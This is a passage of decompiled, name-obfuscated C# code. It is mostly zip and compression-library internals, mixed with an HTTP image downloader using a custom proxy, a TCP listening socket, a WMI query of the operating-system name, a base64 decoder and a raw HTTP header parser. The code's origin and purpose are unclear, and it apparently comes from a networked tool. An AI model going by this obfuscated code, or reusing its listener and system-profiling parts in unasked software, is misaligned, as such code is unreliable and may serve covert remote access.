		zipSegmentedStream.string_0 = string_0;
		zipSegmentedStream.int_0 = int_0;
		zipSegmentedStream.string_1 = Path.GetDirectoryName(string_0);
		ZipSegmentedStream zipSegmentedStream2 = zipSegmentedStream;
		if (zipSegmentedStream2.string_1 == "")
		{
			zipSegmentedStream2.string_1 = ".";
		}
		Class6.smethod_43(zipSegmentedStream2, 0u);
		return zipSegmentedStream2;
	}

	static void smethod_49(GClass0 gclass0_0)
	{
		long position = gclass0_0.ArchiveStream.Position;
		try
		{
			gclass0_0.ArchiveStream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
		}
		catch (IOException exception_)
		{
			string string_ = $"Exception seeking  entry({gclass0_0.string_1}) offset(0x{gclass0_0.long_4:X8}) len(0x{gclass0_0.ArchiveStream.Length:X8})";
			throw new BadStateException(string_, exception_);
		}
		byte[] array = new byte[30];
		gclass0_0.ArchiveStream.Read(array, 0, array.Length);
		short num = (short)(array[26] + array[27] * 256);
		short num2 = (short)(array[28] + array[29] * 256);
		gclass0_0.ArchiveStream.Seek(num + num2, SeekOrigin.Current);
		gclass0_0.int_3 = 30 + num2 + num + Class6.smethod_75(gclass0_0.enum2_1);
		gclass0_0.long_3 = gclass0_0.long_4 + gclass0_0.int_3;
		gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
	}

	static void smethod_50(int int_0, int int_1, int int_2, Class38 class38_0)
	{
		Class6.smethod_465(class38_0, int_0 - 257, 5);
		Class6.smethod_465(class38_0, int_2 - 1, 5);
		Class6.smethod_465(class38_0, int_1 - 4, 4);
		for (int i = 0; i < int_1; i++)
		{
			Class6.smethod_465(class38_0, (int)class38_0.short_4[Class46.sbyte_0[i] * 2 + 1], 3);
		}
		Class6.smethod_493(class38_0.short_2, int_0 - 1, class38_0);
		Class6.smethod_493(class38_0.short_3, int_2 - 1, class38_0);
	}

	static bool smethod_51(GClass0 gclass0_0, long long_0, long long_1, GClass1 gclass1_0)
	{
		EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
		if (eventHandler_ != null)
		{
			EventArgs3 eventArgs = Class6.smethod_11(long_1, gclass0_0, long_0, gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_8 = true;
			}
		}
		return gclass1_0.bool_8;
	}

	static byte smethod_52(Class31 class31_0)
	{
		return (byte)((class31_0.uint_0 >> 32 - class31_0.int_0) & 0xFFu);
	}

	static bool smethod_53(Exception exception_0, GClass0 gclass0_0, GClass1 gclass1_0)
	{
		if (gclass1_0.eventHandler_4 != null)
		{
			lock (gclass1_0.object_0)
			{
				EventArgs5 eventArgs = Class6.smethod_307(gclass0_0, gclass1_0.string_0, exception_0);
				gclass1_0.eventHandler_4(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_8 = true;
				}
			}
		}
		return gclass1_0.bool_8;
	}

	static void smethod_54(GClass1 gclass1_0)
	{
		if (gclass1_0.string_0 == null)
		{
			return;
		}
		if (gclass1_0.stream_1 != null)
		{
			try
			{
				gclass1_0.stream_1.Dispose();
			}
			catch (IOException)
			{
			}
		}
		gclass1_0.stream_1 = null;
		if (gclass1_0.string_4 != null)
		{
			Class6.smethod_293(gclass1_0);
			gclass1_0.string_4 = null;
		}
	}

	static void smethod_55(GClass1 gclass1_0, string string_0)
	{
		if (gclass1_0.string_0 == null)
		{
			gclass1_0.stream_1 = null;
		}
		else
		{
			gclass1_0.string_1 = gclass1_0.string_0;
		}
		gclass1_0.string_0 = string_0;
		if (Directory.Exists(gclass1_0.string_0))
		{
			throw new ZipException("Bad Directory", new ArgumentException("That name specifies an existing directory. Please specify a filename.", "fileName"));
		}
		gclass1_0.bool_5 = true;
		gclass1_0.bool_4 = File.Exists(gclass1_0.string_0);
		Class6.smethod_617(gclass1_0);
	}

	static EventArgs4 smethod_56(GClass0 gclass0_0, string string_0, string string_1)
	{
		EventArgs4 eventArgs = new EventArgs4();
		eventArgs.string_0 = string_0;
		eventArgs.enum6_0 = Enum6.const_18;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.string_1 = string_1;
		return eventArgs;
	}

	static void smethod_57(Stream6 stream6_0)
	{
		Stream6.Class34 class34_ = stream6_0.class34_0;
		bool[] bool_ = class34_.bool_0;
		byte[] byte_ = class34_.byte_4;
		int num = 0;
		for (int i = 0; i < 16; i++)
		{
			if (Class6.smethod_582(stream6_0))
			{
				num |= 1 << i;
			}
		}
		int num2 = 256;
		while (--num2 >= 0)
		{
			bool_[num2] = false;
		}
		for (int j = 0; j < 16; j++)
		{
			if ((num & (1 << j)) == 0)
			{
				continue;
			}
			int num3 = j << 4;
			for (int k = 0; k < 16; k++)
			{
				if (Class6.smethod_582(stream6_0))
				{
					bool_[num3 + k] = true;
				}
			}
		}
		Class6.smethod_135(stream6_0);
		int num4 = stream6_0.int_5 + 2;
		int num5 = Class6.smethod_532(stream6_0, 3);
		int num6 = Class6.smethod_532(stream6_0, 15);
		for (int l = 0; l < num6; l++)
		{
			int num7 = 0;
			while (Class6.smethod_582(stream6_0))
			{
				num7++;
			}
			class34_.byte_2[l] = (byte)num7;
		}
		int num8 = num5;
		while (--num8 >= 0)
		{
			byte_[num8] = (byte)num8;
		}
		for (int m = 0; m < num6; m++)
		{
			int num9 = class34_.byte_2[m];
			byte b = byte_[num9];
			while (num9 > 0)
			{
				byte_[num9] = byte_[num9 - 1];
				num9--;
			}
			byte_[0] = b;
			class34_.byte_1[m] = b;
		}
		char[][] char_ = class34_.char_0;
		for (int n = 0; n < num5; n++)
		{
			int num10 = Class6.smethod_532(stream6_0, 5);
			char[] array = char_[n];
			for (int num11 = 0; num11 < num4; num11++)
			{
				while (Class6.smethod_582(stream6_0))
				{
					num10 += ((!Class6.smethod_582(stream6_0)) ? 1 : (-1));
				}
				array[num11] = (char)num10;
			}
		}
		Class6.smethod_635(num5, num4, stream6_0);
	}

	static GClass1 smethod_58(string string_0, TextWriter textWriter_0, Encoding encoding_0, EventHandler<EventArgs1> eventHandler_0)
	{
		GClass1 gClass = new GClass1();
		gClass.encoding_0 = encoding_0 ?? GClass1.encoding_1;
		gClass.enum9_0 = Enum9.const_3;
		gClass.textWriter_0 = textWriter_0;
		gClass.string_0 = string_0;
		if (eventHandler_0 != null)
		{
			gClass.eventHandler_1 = eventHandler_0;
		}
		if (gClass.textWriter_0 != null)
		{
			gClass.textWriter_0.WriteLine("reading from {0}...", string_0);
		}
		Class6.smethod_101(gClass);
		gClass.bool_4 = true;
		return gClass;
	}

	static bool smethod_59(string string_0, string string_1, Class83 class83_0)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
			httpWebRequest.Proxy = new Class81(class83_0);
			httpWebRequest.KeepAlive = false;
			httpWebRequest.Method = "GET";
			httpWebRequest.Timeout = 180000;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using Stream stream = httpWebResponse.GetResponseStream();
				if (stream != null)
				{
					Image val = Image.FromStream(stream);
					val.Save(string_0, ImageFormat.get_Jpeg());
				}
			}
			if (File.Exists(string_0))
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	static string smethod_60()
	{
		return Class6.smethod_406();
	}

	static bool smethod_61(Stream stream_0, bool bool_0)
	{
		if (stream_0 == null)
		{
			throw new ArgumentNullException("stream");
		}
		bool result = false;
		try
		{
			if (!stream_0.CanRead)
			{
				return false;
			}
			Stream @null = Stream.Null;
			using (GClass1 gClass = Class6.smethod_665(stream_0, (TextWriter)null, (Encoding)null, (EventHandler<EventArgs1>)null))
			{
				if (bool_0)
				{
					using IEnumerator<GClass0> enumerator = gClass.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
					while (enumerator.MoveNext())
					{
						GClass0 current = enumerator.Current;
						if (!current.bool_4)
						{
							Class6.smethod_387(@null, current);
						}
					}
				}
			}
			result = true;
			return result;
		}
		catch (IOException)
		{
			return result;
		}
		catch (ZipException)
		{
			return result;
		}
	}

	static void smethod_62(byte[] byte_0, Class56 class56_0)
	{
		class56_0.byte_1 = byte_0;
	}

	static void smethod_63(string string_0, Assembly assembly_0, string string_1)
	{
		int num = 0;
		byte[] array = new byte[1024];
		using Stream stream = assembly_0.GetManifestResourceStream(string_1);
		if (stream == null)
		{
			throw new ZipException($"missing resource '{string_1}'");
		}
		using FileStream fileStream = File.OpenWrite(string_0);
		do
		{
			num = stream.Read(array, 0, array.Length);
			fileStream.Write(array, 0, num);
		}
		while (num > 0);
	}

	static string smethod_64(string string_0, string string_1, string string_2)
	{
		string text = string_2.ToUpper();
		string text2 = string_1.ToUpper();
		if (text.IndexOf(text2) != 0)
		{
			return string_2;
		}
		return string_0 + string_2.Substring(text2.Length);
	}

	static GClass0 smethod_65(string string_0, GClass1 gclass1_0, Delegate0 delegate0_0)
	{
		GClass0 gclass0_ = Class6.smethod_274(delegate0_0, string_0);
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
		}
		return Class6.smethod_108(gclass1_0, gclass0_);
	}

	static int[] smethod_66(Stream6.Class34 class34_0, int int_0)
	{
		int[] array = class34_0.int_6;
		if (array == null || array.Length < int_0)
		{
			array = (class34_0.int_6 = new int[int_0]);
		}
		return array;
	}

	static string smethod_67(string string_0)
	{
		GClass0.Class22.int_0++;
		if (GClass0.Class22.int_0 > 25)
		{
			throw new OverflowException("overflow while creating filename");
		}
		int num = 1;
		int num2 = string_0.LastIndexOf(".");
		if (num2 == -1)
		{
			Match match = GClass0.Class22.regex_0.Match(string_0);
			if (match.Success)
			{
				num = int.Parse(match.Groups[1].Value) + 1;
				string text = $" (copy {num})";
				string_0 = string_0.Substring(0, match.Index) + text;
			}
			else
			{
				string text2 = $" (copy {num})";
				string_0 += text2;
			}
		}
		else
		{
			Match match2 = GClass0.Class22.regex_0.Match(string_0.Substring(0, num2));
			if (match2.Success)
			{
				num = int.Parse(match2.Groups[1].Value) + 1;
				string text3 = $" (copy {num})";
				string_0 = string_0.Substring(0, match2.Index) + text3 + string_0.Substring(num2);
			}
			else
			{
				string text4 = $" (copy {num})";
				string_0 = string_0.Substring(0, num2) + text4 + string_0.Substring(num2);
			}
		}
		return string_0;
	}

	static int smethod_68(Stream12 stream12_0)
	{
		if (stream12_0.gclass3_0 == null)
		{
			return 0;
		}
		return (int)(~stream12_0.gclass3_0.uint_2);
	}

	static void smethod_69(Stream8 stream8_0)
	{
		stream8_0.queue_0 = new Queue<int>();
		stream8_0.queue_1 = new Queue<int>();
		stream8_0.list_0 = new List<Class36>();
		int val = Stream8.int_0 * Environment.ProcessorCount;
		val = Math.Min(val, stream8_0.int_1);
		for (int i = 0; i < val; i++)
		{
			stream8_0.list_0.Add(new Class36(i, stream8_0.int_6));
			stream8_0.queue_1.Enqueue(i);
		}
		stream8_0.autoResetEvent_0 = new AutoResetEvent(initialState: false);
		stream8_0.int_5 = -1;
		stream8_0.int_2 = -1;
		stream8_0.int_3 = -1;
		stream8_0.int_4 = -1;
	}

	static void smethod_70(Enum25 enum25_0, Class53 class53_0)
	{
		class53_0.enum25_0 = enum25_0;
	}

	static void smethod_71(Class63 class63_0)
	{
		try
		{
			Class6.smethod_661(new Socket(Class6.smethod_244(class63_0).AddressFamily, SocketType.Stream, ProtocolType.Tcp), class63_0);
			Class6.smethod_161(class63_0).Bind(new IPEndPoint(Class6.smethod_244(class63_0), Class6.smethod_72(class63_0)));
			Class6.smethod_161(class63_0).Listen(50);
			Class6.smethod_161(class63_0).BeginAccept(class63_0.vmethod_0, Class6.smethod_161(class63_0));
		}
		catch
		{
			Class6.smethod_661((Socket)null, class63_0);
			throw new SocketException();
		}
	}

	static int smethod_72(Class63 class63_0)
	{
		return class63_0.int_0;
	}

	static string smethod_73(string string_0)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
	}

	static int smethod_74(Class73.Class76 class76_0)
	{
		return 32768 - class76_0.int_1;
	}

	static int smethod_75(Enum2 enum2_0)
	{
		switch (enum2_0)
		{
		case Enum2.const_0:
			return 0;
		case Enum2.const_1:
			return 12;
		default:
			throw new ZipException("internal error");
		case Enum2.const_2:
		case Enum2.const_3:
		{
			int num = Class6.smethod_222(enum2_0);
			return num / 8 / 2 + 2;
		}
		}
	}

	static ICollection<GClass0> smethod_76(string string_0, string string_1, GClass1 gclass1_0)
	{
		Class16 class16_ = new Class16(string_1, gclass1_0.AddDirectoryWillTraverseReparsePoints);
		return Class6.smethod_480(gclass1_0, class16_, string_0);
	}

	static GClass0 smethod_77(string string_0, GClass1 gclass1_0)
	{
		return Class6.smethod_427(string_0, gclass1_0, (string)null);
	}

	static void smethod_78(long long_0, GClass0 gclass0_0, long long_1)
	{
		if (gclass0_0.class8_0.gclass1_0 != null)
		{
			gclass0_0.bool_12 = Class6.smethod_51(gclass0_0, long_1, long_0, gclass0_0.class8_0.gclass1_0);
		}
	}

	static void smethod_79(Class32 class32_0)
	{
		bool[] bool_ = class32_0.class33_0.bool_0;
		bool[] bool_2 = class32_0.class33_0.bool_1;
		int num = 16;
		while (--num >= 0)
		{
			bool_2[num] = false;
			int num2 = num * 16;
			int num3 = 16;
			while (--num3 >= 0)
			{
				if (bool_[num2 + num3])
				{
					bool_2[num] = true;
				}
			}
		}
		uint num4 = 0u;
		for (int i = 0; i < 16; i++)
		{
			if (bool_2[i])
			{
				num4 |= (uint)(1 << 16 - i - 1);
			}
		}
		Class6.smethod_291(class32_0.class31_0, 16, num4);
		for (int j = 0; j < 16; j++)
		{
			if (!bool_2[j])
			{
				continue;
			}
			int num5 = j * 16;
			num4 = 0u;
			for (int k = 0; k < 16; k++)
			{
				if (bool_[num5 + k])
				{
					num4 |= (uint)(1 << 16 - k - 1);
				}
			}
			Class6.smethod_291(class32_0.class31_0, 16, num4);
		}
	}

	static void smethod_80(string string_0, GClass0 gclass0_0, Stream stream_0)
	{
		Class6.smethod_497(string_0, stream_0, (string)null, gclass0_0);
	}

	static void smethod_81(Class53 class53_0, IAsyncResult iasyncResult_0)
	{
		if (iasyncResult_0 == null)
		{
			throw new ArgumentNullException();
		}
		if (!iasyncResult_0.IsCompleted)
		{
			throw new ArgumentException();
		}
		if (Class6.smethod_618(class53_0) != null)
		{
			throw Class6.smethod_618(class53_0);
		}
	}

	static int smethod_82(Class73.Class75 class75_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class75_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class75_0.uint_0;
			class75_0.uint_0 >>= 8;
			class75_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class75_0.int_1 - class75_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class75_0.byte_0, class75_0.int_0, byte_0, int_0, int_1);
		class75_0.int_0 += int_1;
		if (((uint)(class75_0.int_0 - class75_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class75_0.uint_0 = class75_0.byte_0[class75_0.int_0++] & 0xFFu;
			class75_0.int_2 = 8;
		}
		return num + int_1;
	}

	static bool smethod_83(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_84(Class53 class53_0, int int_0)
	{
		class53_0.int_0 = int_0;
	}

	static void smethod_85(int int_0, int int_1, int[] int_2, int int_3, int[] int_4, char[] char_0, int[] int_5)
	{
		int i = int_1;
		int num = 0;
		for (; i <= int_3; i++)
		{
			for (int j = 0; j < int_0; j++)
			{
				if (char_0[j] == i)
				{
					int_4[num++] = j;
				}
			}
		}
		int num2 = Class35.int_4;
		while (--num2 > 0)
		{
			int_2[num2] = 0;
			int_5[num2] = 0;
		}
		for (int k = 0; k < int_0; k++)
		{
			int_2[char_0[k] + 1]++;
		}
		int l = 1;
		int num3 = int_2[0];
		for (; l < Class35.int_4; l++)
		{
			num3 = (int_2[l] = num3 + int_2[l]);
		}
		int m = int_1;
		int num4 = 0;
		int num5 = int_2[m];
		for (; m <= int_3; m++)
		{
			int num6 = int_2[m + 1];
			num4 += num6 - num5;
			num5 = num6;
			int_5[m] = num4 - 1;
			num4 <<= 1;
		}
		for (int n = int_1 + 1; n <= int_3; n++)
		{
			int_2[n] = (int_5[n - 1] + 1 << 1) - int_2[n];
		}
	}

	static Stream smethod_86(Stream stream_0, GClass0 gclass0_0)
	{
		if (gclass0_0.enum2_0 == Enum2.const_1)
		{
			return new Stream5(stream_0, gclass0_0.class21_1, Enum5.const_0);
		}
		if (gclass0_0.enum2_0 != Enum2.const_2 && gclass0_0.enum2_0 != Enum2.const_3)
		{
			return stream_0;
		}
		return new Stream3(stream_0, gclass0_0.class19_1, Enum5.const_0);
	}

	static string smethod_87(Class59 class59_0)
	{
		return class59_0.string_1;
	}

	static void smethod_88(GClass1 gclass1_0, string string_0)
	{
		bool flag = false;
		int num = 3;
		for (int i = 0; i < num; i++)
		{
			if (flag)
			{
				break;
			}
			try
			{
				File.Delete(string_0);
				flag = true;
			}
			catch (UnauthorizedAccessException)
			{
				Console.WriteLine("************************************************** Retry delete.");
				Thread.Sleep(200 + i * 200);
			}
		}
	}

	static Enum8 smethod_89(Stream0 stream0_0)
	{
		return stream0_0.enum8_0;
	}

	static int smethod_90(Class38 class38_0, Enum19 enum19_0)
	{
		if (class38_0.gclass2_0.byte_1 != null && (class38_0.gclass2_0.byte_0 != null || class38_0.gclass2_0.int_1 == 0) && (class38_0.int_19 != Class38.int_5 || enum19_0 == Enum19.const_4))
		{
			if (class38_0.gclass2_0.int_3 == 0)
			{
				class38_0.gclass2_0.string_0 = Class38.string_0[7];
				throw new GException0("OutputBuffer is full (AvailableBytesOut == 0)");
			}
			int int_ = class38_0.int_22;
			class38_0.int_22 = (int)enum19_0;
			if (class38_0.int_19 == Class38.int_3)
			{
				int num = Class38.int_6 + (class38_0.int_24 - 8 << 4) << 8;
				int num2 = (int)((class38_0.enum20_0 - 1) & (Enum20)255) >> 1;
				if (num2 > 3)
				{
					num2 = 3;
				}
				num |= num2 << 6;
				if (class38_0.int_36 != 0)
				{
					num |= Class38.int_2;
				}
				num += 31 - num % 31;
				class38_0.int_19 = Class38.int_4;
				class38_0.byte_0[class38_0.int_21++] = (byte)(num >> 8);
				class38_0.byte_0[class38_0.int_21++] = (byte)num;
				if (class38_0.int_36 != 0)
				{
					class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF000000u) >> 24);
					class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF0000) >> 16);
					class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF00) >> 8);
					class38_0.byte_0[class38_0.int_21++] = (byte)(class38_0.gclass2_0.uint_0 & 0xFFu);
				}
				class38_0.gclass2_0.uint_0 = Class6.smethod_439(0u, (byte[])null, 0, 0);
			}
			if (class38_0.int_21 != 0)
			{
				Class6.smethod_243(class38_0.gclass2_0);
				if (class38_0.gclass2_0.int_3 == 0)
				{
					class38_0.int_22 = -1;
					return 0;
				}
			}
			else if (class38_0.gclass2_0.int_1 == 0 && (int)enum19_0 <= int_ && enum19_0 != Enum19.const_4)
			{
				return 0;
			}
			if (class38_0.int_19 == Class38.int_5 && class38_0.gclass2_0.int_1 != 0)
			{
				class38_0.gclass2_0.string_0 = Class38.string_0[7];
				throw new GException0("status == FINISH_STATE && _codec.AvailableBytesIn != 0");
			}
			if (class38_0.gclass2_0.int_1 != 0 || class38_0.int_38 != 0 || (enum19_0 != 0 && class38_0.int_19 != Class38.int_5))
			{
				Enum14 @enum = class38_0.delegate5_0(enum19_0);
				if (@enum == Enum14.const_2 || @enum == Enum14.const_3)
				{
					class38_0.int_19 = Class38.int_5;
				}
				if (@enum == Enum14.const_0 || @enum == Enum14.const_2)
				{
					if (class38_0.gclass2_0.int_3 == 0)
					{
						class38_0.int_22 = -1;
					}
					return 0;
				}
				if (@enum == Enum14.const_1)
				{
					if (enum19_0 == Enum19.const_1)
					{
						Class6.smethod_124(class38_0);
					}
					else
					{
						Class6.smethod_637(class38_0, 0, 0, bool_0: false);
						if (enum19_0 == Enum19.const_3)
						{
							for (int i = 0; i < class38_0.int_28; i++)
							{
								class38_0.short_1[i] = 0;
							}
						}
					}
					Class6.smethod_243(class38_0.gclass2_0);
					if (class38_0.gclass2_0.int_3 == 0)
					{
						class38_0.int_22 = -1;
						return 0;
					}
				}
			}
			if (enum19_0 != Enum19.const_4)
			{
				return 0;
			}
			if (class38_0.bool_1 && !class38_0.bool_0)
			{
				class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF000000u) >> 24);
				class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF0000) >> 16);
				class38_0.byte_0[class38_0.int_21++] = (byte)((class38_0.gclass2_0.uint_0 & 0xFF00) >> 8);
				class38_0.byte_0[class38_0.int_21++] = (byte)(class38_0.gclass2_0.uint_0 & 0xFFu);
				Class6.smethod_243(class38_0.gclass2_0);
				class38_0.bool_0 = true;
				if (class38_0.int_21 == 0)
				{
					return 1;
				}
				return 0;
			}
			return 1;
		}
		class38_0.gclass2_0.string_0 = Class38.string_0[4];
		throw new GException0($"Something is fishy. [{class38_0.gclass2_0.string_0}]");
	}

	static StringDictionary smethod_91(string string_0, Class61 class61_0)
	{
		StringDictionary stringDictionary = new StringDictionary();
		string[] array = string_0.Replace("\r\n", "\n").Split(new char[1] { '\n' });
		if (array.Length != 0)
		{
			int num = array[0].IndexOf(' ');
			if (num > 0)
			{
				class61_0.string_3 = array[0].Substring(0, num);
				array[0] = array[0].Substring(num).Trim();
			}
			num = array[0].LastIndexOf(' ');
			if (num > 0)
			{
				class61_0.string_2 = array[0].Substring(num).Trim();
				class61_0.string_1 = array[0].Substring(0, num);
			}
			else
			{
				class61_0.string_1 = array[0];
			}
			if (Class6.smethod_106(class61_0).Length >= 7 && Class6.smethod_106(class61_0).Substring(0, 7).ToLower()
				.Equals("http://"))
			{
				num = Class6.smethod_106(class61_0).IndexOf('/', 7);
				if (num == -1)
				{
					class61_0.string_1 = "/";
				}
				else
				{
					class61_0.string_1 = Class6.smethod_106(class61_0).Substring(num);
				}
			}
		}
		for (int i = 1; i < array.Length; i++)
		{
			int num = array[i].IndexOf(":");
			if (num > 0 && num < array[i].Length - 1)
			{
				try
				{
					stringDictionary.Add(array[i].Substring(0, num), array[i].Substring(num + 1).Trim());
				}
				catch
				{
				}
			}
		}
		return stringDictionary;
	}

	static int smethod_92(Enum20 enum20_0, GClass2 gclass2_0, bool bool_0)
	{
		gclass2_0.enum20_0 = enum20_0;
		return Class6.smethod_128(gclass2_0, bool_0);
	}

	static void smethod_93(string string_0, GClass1 gclass1_0)
	{
		Class6.smethod_5((string)null, string_0, gclass1_0);
	}

	static ICollection<GClass0> smethod_94(Class16 class16_0, GClass1 gclass1_0)
	{
		if (gclass1_0 == null)
		{
			throw new ArgumentNullException("zip");
		}
		List<GClass0> list = new List<GClass0>();
		using IEnumerator<GClass0> enumerator = gclass1_0.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
		while (enumerator.MoveNext())
		{
			GClass0 current = enumerator.Current;
			if (Class6.smethod_163(class16_0, current))
			{
				list.Add(current);
			}
		}
		return list;
	}

	static void smethod_95(Class57 class57_0, int int_0)
	{
		class57_0.int_0 = int_0;
	}

	static void smethod_96(Stream8 stream8_0, bool bool_0, bool bool_1)
	{
		if (stream8_0.bool_2)
		{
			return;
		}
		stream8_0.bool_2 = true;
		if (bool_0 || bool_1)
		{
			stream8_0.autoResetEvent_0.WaitOne();
		}
		do
		{
			int num = -1;
			int num2 = (bool_0 ? 200 : (bool_1 ? (-1) : 0));
			int num3 = -1;
			do
			{
				if (!Monitor.TryEnter(stream8_0.queue_0, num2))
				{
					num3 = -1;
					continue;
				}
				num3 = -1;
				try
				{
					if (stream8_0.queue_0.Count > 0)
					{
						num3 = stream8_0.queue_0.Dequeue();
					}
				}
				finally
				{
					Monitor.Exit(stream8_0.queue_0);
				}
				if (num3 < 0)
				{
					continue;
				}
				Class36 @class = stream8_0.list_0[num3];
				if (@class.int_1 != stream8_0.int_3 + 1)
				{
					lock (stream8_0.queue_0)
					{
						stream8_0.queue_0.Enqueue(num3);
					}
					if (num == num3)
					{
						stream8_0.autoResetEvent_0.WaitOne();
						num = -1;
					}
					else if (num == -1)
					{
						num = num3;
					}
					continue;
				}
				num = -1;
				Class31 class31_ = @class.class31_0;
				Class6.smethod_304(class31_);
				MemoryStream memoryStream_ = @class.memoryStream_0;
				memoryStream_.Seek(0L, SeekOrigin.Begin);
				long num4 = 0L;
				byte[] array = new byte[1024];
				int num5;
				while ((num5 = memoryStream_.Read(array, 0, array.Length)) > 0)
				{
					for (int i = 0; i < num5; i++)
					{
						Class6.smethod_224(stream8_0.class31_0, array[i]);
					}
					num4 += num5;
				}
				if (class31_.int_0 > 0)
				{
					Class6.smethod_291(stream8_0.class31_0, class31_.int_0, (uint)Class6.smethod_52(class31_));
				}
				stream8_0.uint_0 = (stream8_0.uint_0 << 1) | (stream8_0.uint_0 >> 31);
				stream8_0.uint_0 ^= @class.method_0().method_0();
				stream8_0.long_1 += num4;
				Class6.smethod_306(class31_);
				stream8_0.int_3 = @class.int_1;
				@class.int_1 = -1;
				stream8_0.queue_1.Enqueue(@class.int_0);
				if (num2 == -1)
				{
					num2 = 0;
				}
			}
			while (num3 >= 0);
		}
		while (bool_0 && stream8_0.int_3 != stream8_0.int_4);
		stream8_0.bool_2 = false;
	}

	static void smethod_97(GClass1 gclass1_0, string string_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 e = Class6.smethod_445(gclass1_0.ArchiveNameForEvent, string_0);
			eventHandler_(gclass1_0, e);
		}
	}

	static EventArgs1 smethod_98(string string_0, int int_0)
	{
		EventArgs1 eventArgs = new EventArgs1(string_0, Enum6.const_4);
		eventArgs.int_0 = int_0;
		return eventArgs;
	}

	static string smethod_99(Form1 form1_0)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		return (from ManagementObject managementObject_0 in (IEnumerable)new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get()
			select ((ManagementBaseObject)managementObject_0).GetPropertyValue("Caption")).FirstOrDefault()?.ToString();
	}

	static Socket smethod_100(Class57 class57_0)
	{
		return class57_0.socket_0;
	}

	static void smethod_101(GClass1 gclass1_0)
	{
		Stream readStream = gclass1_0.ReadStream;
		try
		{
			gclass1_0.string_1 = gclass1_0.string_0;
			if (!readStream.CanSeek)
			{
				Class6.smethod_462(gclass1_0);
				return;
			}
			Class6.smethod_218(gclass1_0);
			uint num = Class6.smethod_504(readStream);
			if (num == 101010256)
			{
				return;
			}
			int num2 = 0;
			bool flag = false;
			long num3 = readStream.Length - 64L;
			long num4 = Math.Max(readStream.Length - 16384L, 10L);
			do
			{
				if (num3 < 0L)
				{
					num3 = 0L;
				}
				readStream.Seek(num3, SeekOrigin.Begin);
				long num5 = Class6.smethod_30(readStream, 101010256);
				if (num5 != -1L)
				{
					flag = true;
					continue;
				}
				if (num3 == 0L)
				{
					break;
				}
				num2++;
				num3 -= 32 * (num2 + 1) * num2;
			}
			while (!flag && num3 > num4);
			if (flag)
			{
				gclass1_0.long_0 = readStream.Position - 4L;
				byte[] array = new byte[16];
				readStream.Read(array, 0, array.Length);
				gclass1_0.uint_0 = BitConverter.ToUInt16(array, 2);
				if (gclass1_0.uint_0 == 65535)
				{
					throw new ZipException("Spanned archives with more than 65534 segments are not supported at this time.");
				}
				gclass1_0.uint_0++;
				uint num6 = BitConverter.ToUInt32(array, 12);
				if (num6 == uint.MaxValue)
				{
					Class6.smethod_251(gclass1_0);
				}
				else
				{
					gclass1_0.uint_2 = num6;
					readStream.Seek(num6, SeekOrigin.Begin);
				}
				Class6.smethod_372(gclass1_0);
			}
			else
			{
				readStream.Seek(0L, SeekOrigin.Begin);
				Class6.smethod_462(gclass1_0);
			}
		}
		catch (Exception exception_)
		{
			if (gclass1_0.bool_7 && gclass1_0.stream_0 != null)
			{
				gclass1_0.stream_0.Dispose();
				gclass1_0.stream_0 = null;
			}
			throw new ZipException("Cannot read that as a ZipFile", exception_);
		}
		gclass1_0.bool_5 = false;
	}

	static string smethod_102(byte[] byte_0)
	{
		return Class6.smethod_408(Class20.encoding_1, byte_0);
	}

	static void smethod_103(string string_0, bool bool_0, string string_1, string string_2, GClass1 gclass1_0, bool bool_1)
	{
		if (string_2 == null && Directory.Exists(string_0))
		{
			string_2 = string_0;
			string_0 = "*.*";
		}
		else if (string.IsNullOrEmpty(string_2))
		{
			string_2 = ".";
		}
		while (string_2.EndsWith("\\"))
		{
			string_2 = string_2.Substring(0, string_2.Length - 1);
		}
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("adding selection '{0}' from dir '{1}'...", string_0, string_2);
		}
		Class16 class16_ = new Class16(string_0, gclass1_0.AddDirectoryWillTraverseReparsePoints);
		ReadOnlyCollection<string> readOnlyCollection = Class6.smethod_673(string_2, class16_, bool_0);
